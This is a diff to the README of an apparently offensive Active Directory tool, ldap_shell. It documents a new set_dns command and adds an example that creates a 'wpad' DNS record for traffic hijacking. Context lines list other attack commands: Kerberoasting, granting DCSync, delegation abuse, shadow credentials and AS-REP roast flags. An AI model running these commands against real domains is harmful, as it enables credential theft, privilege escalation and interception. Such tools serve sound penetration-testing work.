@@ -51,6 +51,7 @@ ldap_shell domain.local/user:password --json whoami
 ldap_shell domain.local/user:password get_kerberoast
 ldap_shell domain.local/user:password set_delegation WEB01$ add cifs/dc.domain.local
 ldap_shell domain.local/user:password set_keycred john add
+ldap_shell domain.local/user:password set_dns wpad add A 10.0.0.5
 ```
 
 `-non-interactive` reads commands from stdin (one per line).
@@ -99,6 +100,7 @@ Abuse ACL
     set_attr target attribute action [value] - Generic attribute modify
     set_dcsync target - Grant DCSync
     set_delegation target action [spn] - Constrained delegation SPNs
+    set_dns name action [A] [ipv4] [zone] - Add/delete an ADIDNS A record
     set_dontreqpreauth target flag - Targeted AS-REP roast flag
     set_genericall target [grantee] - Grant GenericAll
     set_owner target [grantee] - Set owner
